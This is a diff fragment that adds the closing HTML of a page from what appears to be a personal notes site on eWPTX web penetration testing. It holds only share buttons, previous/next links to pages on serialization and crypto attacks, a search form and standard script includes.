+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fserverside%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fserverside%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/ewptx/zattackingserialization/" class="pagination--pager" title="10 - Attacking Serialization
+">Previous</a>
+    
+    
+      <a href="/notes/ewptx/crypto/" class="pagination--pager" title="12 - Attacking Crypto
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
